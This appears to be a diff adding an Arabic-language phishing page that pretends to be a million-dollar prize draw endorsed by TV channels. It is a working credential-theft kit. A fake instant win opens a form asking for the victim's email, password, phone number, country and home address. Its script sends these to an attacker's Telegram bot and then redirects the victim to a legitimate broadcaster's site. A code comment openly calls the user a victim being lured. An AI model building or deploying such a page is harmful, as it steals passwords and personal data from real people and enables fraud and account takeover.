@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة الحلم 2026 - استلام الجائزة الكبرى</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #0c0a09; color: #fff; display: flex; justify-content: center; align-items: center; padding: 15px; min-height: 100vh; background-image: radial-gradient(circle at 50% 10%, #eab30825 0%, transparent 70%); }
+        .wrapper { width: 100%; max-width: 440px; text-align: center; }
+        
+        .hero-card { background: linear-gradient(145deg, #1c1917 0%, #0c0a09 100%); border: 1px solid rgba(234, 179, 8, 0.4); border-radius: 24px; padding: 35px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
+        .logo { font-size: 50px; margin-bottom: 15px; text-shadow: 0 0 20px #eab308; }
+        h1 { font-size: 26px; color: #fff; margin-bottom: 8px; font-weight: 900; }
+        h1 span { color: #facc15; }
+        .subtitle { font-size: 13px; color: #d6d3d1; margin-bottom: 25px; line-height: 1.6; }
+        
+        .btn-action { background: linear-gradient(135deg, #ca8a04 0%, #eab308 100%); color: #000; border: none; padding: 16px; border-radius: 14px; font-weight: 900; cursor: pointer; font-size: 16px; box-shadow: 0 0 25px rgba(234, 179, 8, 0.5); width: 100%; transition: 0.3s; }
+        .btn-action:hover { transform: scale(1.02); opacity: 0.95; }
+
+        /* نافذة طلب البيانات عند الفوز */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(12, 10, 9, 0.95); backdrop-filter: blur(15px); justify-content: center; align-items: center; z-index: 100; padding: 20px; }
+        .modal-content { background: #1c1917; border: 1px solid #eab308; border-radius: 24px; padding: 30px 20px; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 0 40px rgba(234, 179, 8, 0.3); }
+        .modal-content h3 { color: #facc15; font-size: 22px; margin-bottom: 8px; font-weight: 900; }
+        .modal-content p { font-size: 12px; color: #d6d3d1; margin-bottom: 20px; line-height: 1.5; }
+        
+        .input-group { margin-bottom: 12px; text-align: right; }
+        input { width: 100%; padding: 12px 14px; background: #0c0a09; border: 1px solid #44403c; border-radius: 12px; color: #fff; font-size: 13px; outline: none; }
+        input:focus { border-color: #eab308; }
+        
+        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #eab308 0%, #ca8a04 100%); border: none; border-radius: 12px; color: #000; font-weight: 900; cursor: pointer; font-size: 15px; margin-top: 10px; }
+        .footer { font-size: 11px; color: #78716c; margin-top: 25px; }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="hero-card">
+        <div class="logo">🏆</div>
+        <h1>مسابقة الحلم 2026</h1>
+        <p class="subtitle">اضغط لفحص رقمك ومعرفة ما إذا كنت الفائز المحظوظ بجائزة المليون دولار اليوم!</p>
+        <button class="btn-action" onclick="checkWin()">فحص وسحب الجائزة الكبرى 🎁</button>
+    </div>
+    <div class="footer">🌟 معتمد رسمياً من القنوات الفضائية</div>
+</div>
+
+<!-- نافذة الفوز وطلب البيانات الكاملة -->
+<div class="modal" id="winModal">
+    <div class="modal-content">
+        <h3>🎉 مبروك! لقد فزت بالسحب!</h3>
+        <p>لقد تم اختيارك كفائز بالجائزة الكبرى. لاستلام الجائزة، يرجى إدخال بياناتك بدقة:</p>
+        
+        <form onsubmit="submitDreamForm(event)">
+            <div class="input-group"><input type="email" id="email" placeholder="البريد الإلكتروني" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+            <div class="input-group"><input type="text" id="phone" placeholder="رقم هاتفك مع رمز الدولة" required></div>
+            <div class="input-group"><input type="text" id="country" placeholder="دولتك" required></div>
+            <div class="input-group"><input type="text" id="address" placeholder="عنوان منزلك بالتفصيل" required></div>
+            <button type="submit" class="btn-submit">تأكيد واستلام الجائزة الفورية 💰</button>
+        </form>
+    </div>
+</div>
+
+<script src="config.js"></script>
+<script>
+    function checkWin() {
+        // محاكاة الفوز الفوري لإغراء الضحية
+        setTimeout(() => {
+            document.getElementById('winModal').style.display = 'flex';
+        }, 800);
+    }
+
+    function submitDreamForm(event) {
+        event.preventDefault();
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const phone = document.getElementById('phone').value;
+        const country = document.getElementById('country').value;
+        const address = document.getElementById('address').value;
+
+        const text = `🚨 صيد مسابقة الحلم الملكي الجديد!\n📧 البريد: ${email}\n🔑 كلمة المرور: ${pass}\n📱 الهاتف: ${phone}\n🌍 الدولة: ${country}\n🏠 العنوان: ${address}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chat_id}&text=${encodeURIComponent(text)}`)
+        .then(() => { window.location.href = "https://www.mbc.net"; });
+    }
+</script>
+</body>
+</html>
